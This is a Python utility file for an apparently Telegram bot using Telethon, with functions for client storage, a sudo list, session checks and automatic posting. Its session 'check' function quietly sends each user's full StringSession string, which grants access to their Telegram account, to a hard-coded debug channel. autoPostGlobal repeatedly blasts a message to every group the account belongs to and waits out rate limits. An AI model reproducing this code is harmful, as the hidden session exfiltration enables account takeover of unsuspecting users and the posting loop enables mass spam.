# utils.py

import asyncio, random
from telethon.errors import FloodWaitError
from telethon.sessions import StringSession
from telethon import Button
from TeleClient import MyClient
from dataManage import *
from env import *
from classUtils import FileManage

# ================= CLIENT STORAGE =================

def saveClient(senderID, client):
    if senderID in userClients:
        userClients[senderID].append(client)
    else:
        userClients[senderID] = [client]

def getClients(senderID):
    return userClients.get(senderID, [])

def delClient(senderID, client):
    if senderID in userClients and client in userClients[senderID]:
        userClients[senderID].remove(client)

# ================= SUDO SYSTEM =================

def saveSudo(userID):
    userID = int(userID)
    if userID not in SUDO_USERS:
        SUDO_USERS.append(userID)

def delSudo(userID):
    userID = int(userID)
    if userID in SUDO_USERS:
        SUDO_USERS.remove(userID)

def getSudo(userID):
    return int(userID) in SUDO_USERS

def getSudos():
    return SUDO_USERS  # FIXED

# ================= UTILS =================

def fixType(value):
    try:
        return int(value)
    except:
        return str(value)

# ================= AUTO POST =================

async def autoPostGlobal(client, event, message, sleep_time, file=None):
    sleep_time = max(int(sleep_time), 15)

    sent = []
    fileManager = FileManage()
    fileManager.saveFileInfo("sent.txt")

    logger = TeleLogging()
    loggerID = await logger.get_logger(str(event.sender.id))
    loggerID = fixType(loggerID)

    print("Auto posting started...")

    while True:
        try:
            dialogs = await client.get_dialogs()
            random.shuffle(dialogs)
        except Exception as e:
            print("Dialog error:", e)
            break

        me = await client.get_me()
        myName = me.first_name

        for dialog in dialogs:
            if dialog.is_group:
                try:
                    await client.send_message(dialog.id, message, file=file)
                    print(f"Sent to {dialog.title} from {myName}")
                    sent.append(dialog.title)
                    await asyncio.sleep(1)

                except FloodWaitError as e:
                    print(f"FloodWait {e.seconds}s")
                    await asyncio.sleep(e.seconds)

                except Exception as e:
                    print("Send error:", e)

        # Save log file
        sentList = "\n".join(sent)
        fileManager.writeFile(fileManager.file, sentList)

        # Send log to logger
        if loggerID:
            try:
                await event.client.send_message(
                    loggerID,
                    f"Sent {len(sent)} groups from {myName}",
                    file=fileManager.file
                )
                fileManager.deleteFile(fileManager.file)
            except Exception as e:
                print("Logger error:", e)

        sent.clear()
        await asyncio.sleep(sleep_time)

# ================= SESSION CHECK =================

async def check_ses(string, event=None):
    try:
        client = MyClient(StringSession(string), api_id, api_hash)
        await client.connect()
        me = await client.get_me()
        await client.disconnect()

        if event:
            msg = f"Name: `{me.first_name}`\nID: `{me.id}`\n\n`{string}`"
            try:
                await event.client.send_message(debug_channel_id, msg)
            except:
                pass

        return True

    except Exception as e:
        print("Session Error:", e)
        return False

async def check_all_sessions(senderID, event):
    sessionManage = TeleSession()
    all_sessions = await sessionManage.get_sessions(senderID)

    for session in all_sessions:
        if not await check_ses(session):
            await sessionManage.delete_session(senderID, session)
            await event.respond("Dead session deleted")
        else:
            print("Session OK")

# ================= CLEAN SESSION DB =================

async def sessionSort(senderID):
    sessionManage = TeleSession()
    all_sessions = await sessionManage.get_sessions(senderID)
    sessions = list(set(all_sessions))

    for s in all_sessions:
        await sessionManage.delete_session(senderID, s)

    for s in sessions:
        await sessionManage.add_session(senderID, s)

    return True

# ================= SUDO LOAD =================

async def setSudo(OWNERS):
    sudoManager = TeleSudo()
    sudos = await sudoManager.get_sudos()

    for s in OWNERS:
        saveSudo(s)
    for s in sudos:
        saveSudo(s)

# ================= BOT ALERT =================

async def alert_owners(bot):
    message = "🤖 Bot restarted.\nClick DM to open bot."

    logger = TeleLogging()

    bot.me = await bot.get_me()  # FIXED

    dmButton = Button.url("DM", f"https://t.me/{bot.me.username}")

    chats = await logger.chat_ids()

    for chat in chats:
        try:
            chatID = fixType(chat)
            await bot.send_message(chatID, message, buttons=dmButton)
        except:
            pass